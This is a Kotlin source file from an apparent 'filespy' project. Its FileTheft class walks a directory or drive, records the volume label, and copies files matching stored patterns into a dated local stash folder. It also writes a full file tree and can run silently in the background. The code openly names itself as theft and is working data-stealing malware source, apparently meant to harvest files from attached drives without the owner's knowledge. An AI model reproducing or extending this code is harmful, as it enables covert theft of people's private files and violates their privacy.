package studio.papercube.sh.filespy

import studio.papercube.library.fileassist.DriveMarker
import studio.papercube.library.fileassist.getVolumeLabel
import studio.papercube.library.fileassist.label
import studio.papercube.library.fileassist.validateFileName
import studio.papercube.sh.filespy.concurrent.sharedExecutor
import java.io.File
import java.time.LocalDate
import java.time.LocalTime
import java.util.concurrent.Future
import java.util.stream.Collectors

class FileTheft(val directory: File) : Theft {
    companion object {
        private const val STEAL_RESULT_FAILURE = 1
        private const val STEAL_RESULT_SUCCESS = 0
        private const val LOG_TAG = "FileTheft"
        @JvmStatic
        private fun timeStamp() = System.currentTimeMillis()

        @JvmStatic
        fun stealSingleFile(f: File,
                            destDir: File = File("${ConfigParameters.instance.dataPath}/${LocalDate.now()}/")): Boolean {
            try {
                val targetFile = File("${destDir.absolutePath}/${f.nameWithoutExtension}-${timeStamp()}.${f.extension}")
                f.copyTo(targetFile, bufferSize = 16384)
                targetFile.setLastModified(f.lastModified())
            } catch (e: Exception) {
//                e.printStackTrace()
                return false
            }
            return true
        }

    }


    override fun steal() {
        log.i(LOG_TAG, "Stealing $directory on thread ${Thread.currentThread().name}")
        val patterns = PatternsManager.default.readPatterns()
        val driveMarker = DriveMarker.inDrive(directory)
        try {
            driveMarker.resolve()
        } catch (e: Exception) {
            log.e(tag = "DriveMarker", msg = "Failed to mark drive", e = e)
        }
        val destDir = File(
                "${ConfigParameters.instance.dataPath}/" +
                        "${LocalDate.now()}" +
                        "/${LocalTime.now().toString().replace(':', '-').validateFileName()}" +
                        "-${directory.label}" +
                        "-${directory.getVolumeLabel().validateFileName()}" +
                        "-${driveMarker.markID()}"
        )
        destDir.mkdirs()
        log.i(LOG_TAG, "Destination dir: $destDir")
        val fileWalker = FileWalker(directory)
        val completeFileList = fileWalker.walk()
        reportExceptionsIfNecessary(fileWalker.getExceptions())

        val stealResults: Map<Int, Long> = completeFileList
                .stream()
                .filter { fileToCheck -> patterns.any { pattern -> pattern.matchesWithName(fileToCheck.name) } }
                .map { if (stealSingleFile(it, destDir)) STEAL_RESULT_SUCCESS else STEAL_RESULT_FAILURE }
                .collect(Collectors.groupingBy({ value: Int -> value }, Collectors.counting()))


        try {
            File(destDir, "__FileTree__.txt").bufferedWriter().use { treeWriter->
                treeWriter.write(fileWalker.fileTreeString)
            }
        } catch (e: Exception) {
            log.e("FileTheft.FileTreeWriter", msg = "Failed to write file tree.", e = e)
        }

        log.i(LOG_TAG, "Done stealing $directory. " +
                "${stealResults[STEAL_RESULT_SUCCESS] ?: 0} file(s) succeeded, " +
                "${stealResults[STEAL_RESULT_FAILURE] ?: 0} failed")
    }

    private fun reportExceptionsIfNecessary(exceptions: List<Throwable>) {
        if (!exceptions.isEmpty()) {
            log.w(LOG_TAG, "${exceptions.size} exceptions encountered walking ${directory.absolutePath}")
            val headExceptions = exceptions
                    .take(30)
                    .joinToString(separator = "\n", prefix = "\n") { it.toString() }
            log.w(LOG_TAG, "The first 30 exceptions are : $headExceptions")
        }
    }

    fun stealAsync(): Future<*> {
        return sharedExecutor.submit {
            try {
                steal()
            } catch (e: Exception) {
                log.e(
                        tag = LOG_TAG,
                        msg = "Unexpected exception raised when executing file theft asynchronously on ${Thread.currentThread().name}.",
                        e = e
                )
            }
        }
    }


}